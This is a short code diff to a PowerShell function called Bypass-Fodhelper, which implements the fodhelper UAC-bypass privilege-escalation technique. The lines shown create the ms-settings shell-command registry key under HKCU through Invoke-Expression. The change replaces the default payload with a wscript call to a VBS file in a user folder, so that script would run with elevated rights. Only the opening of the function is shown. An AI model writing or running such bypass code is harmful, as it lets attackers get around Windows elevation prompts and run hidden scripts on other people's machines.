@@ -1,5 +1,5 @@
 function Bypass-Fodhelper {
-    param($x='powershell.exe') #You can also use your own programs but use the full path
+    param($x='wscript "C:\Users\roshan\System\script.vbs"') #You can also use your own programs but use the full path
 
     $h='HKCU:\Software\Classes\ms-settings\Shell\Open\command'
     Invoke-Expression "New-Item '$h' -Force"
